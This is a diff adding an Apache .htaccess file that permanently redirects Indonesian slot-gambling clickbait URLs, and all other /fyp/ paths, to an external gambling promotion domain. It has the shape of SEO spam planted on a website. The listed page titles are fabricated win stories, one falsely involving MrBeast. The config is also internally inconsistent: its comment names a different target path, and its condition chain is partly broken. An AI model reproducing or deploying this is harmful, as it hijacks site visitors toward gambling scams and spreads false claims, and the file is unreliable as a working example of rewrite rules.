@@ -1,0 +1,18 @@
+RewriteEngine On
+
+# ✅ Redirect URL tertentu ke preciseurl.org/reff1
+RewriteCond %{REQUEST_URI} ^/fyp/Live-eksklusif-Instagram-indonesia-bagikan-pola-khusus-setiap-hari-raih-kemenangan-947juta\.html$ [OR]
+RewriteCond %{REQUEST_URI} ^/fyp/Yutube-terbukti-bisa-beri-saran-pola-pada-pengguna-yang-ingin-jackpot-gates-of-olympus-x1000\.html$ [OR]
+RewriteCond %{REQUEST_URI} ^/fyp/Bana-raih-kemenangan-spin-manual-gates-of-olympus\.html$ [OR]
+RewriteCond %{REQUEST_URI} ^/fyp/35-juta-mahjong-ways-andi-kirim-adik-sekolah-beli-laptop-bekas\.html$
+RewriteCond %{REQUEST_URI} ^/fyp/Mahasiswa-asal-Medan-berhasil-bongkar-rahasia-kemenangan-854juta-mahjong-ways-2\.html$
+RewriteCond %{REQUEST_URI} ^/fyp/MrBeast-Suntik-5M-Beli-Saham-Pragmatic-Play-Beri-Kemenangan-Untuk-1000-Orang-pertama-Hari-Ini\.html$
+RewriteCond %{REQUEST_URI} ^/fyp/Gondrong-berhasil-buka-toko-sepatu-impian-karena-scatter-hitam\.html$
+RewriteCond %{REQUEST_URI} ^/fyp/Ardiansyah-berhasil-keliling-dunia-raih-kemenangan-wild-bounty\.html$
+RewriteCond %{REQUEST_URI} ^/fyp/berkat-wild-bounty-ase-membeli-1-unit-fortuner\.html$
+RewriteCond %{REQUEST_URI} ^/fyp/dalam-2-menit-agus-raih-kemenangan-dengan-satu-putaran-terakhirnya\.html$
+RewriteRule ^.*$ https://preciseurl.org/gacor-kali-bray [L,R=301]
+
+# 🧲 Catch-all: Semua URL di /fyp/ yang tidak disebut di atas
+RewriteCond %{REQUEST_URI} ^/fyp/
+RewriteRule ^.*$ https://preciseurl.org/gacor-kali-bray [L,R=301]
